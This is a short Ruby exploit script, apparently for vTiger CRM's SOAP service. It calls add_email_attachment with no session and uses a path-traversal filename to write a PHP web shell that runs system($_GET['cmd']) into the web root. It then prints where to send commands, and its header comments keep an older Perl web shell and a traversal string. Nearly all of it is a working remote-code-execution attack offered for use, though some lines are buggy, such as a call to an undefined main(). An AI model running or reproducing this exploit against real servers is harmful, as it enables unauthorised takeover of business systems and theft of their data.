# simple program to spawn or get a Shell on vTiger CRM SOAP Services
#
#Built off of some old perl shell code i built, adding this and modifying
# my $GETCMD       = '<?php echo("'.$beginning.'"); system($_GET[\'cmd\']); echo("'.$ending.'"); ?>';
#my $d        = "../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..";
#my @logfer        = `cat httpdlogs.conf`;


require 'savon'

uri = ARGV[0] || ''.empty?
usr = ARGV[1] || 'rando'.empty?
php_app = ARGV[2] || 'index.php'.empty?

main_client = Savon::Client.new(wsdl: uri)
shell_code = "<?php system($_GET['cmd']); ?>"

# check arguments

if ARGV.nil? 
    puts "[-] Please enter a URL Next time"
    exit!
end
if ARGV[1].nil?
    puts "[-] i need a username"
    exit!
end
if ARGV[2].nil?
    puts "\033[34m[-] i need an extension"
    exit!
end


main_client = Savon::Client.new(wsdl: uri)
resp = main_client.call(:add_email_attachment, 
:message => {
    emailid: rand(1000),
    filedata: [shell_code].pack("m0"),
    filename: "../../../../../../#{php_app}",
    filesize: shell_code.size,
    filetype: "php",
    username: usr, 
    sessionid: nil
})
puts resp    
main("#{usr}", "nhr.php")
puts "php shell on   > #{uri}"
puts "shell on param > #{php_app}cmd=id"


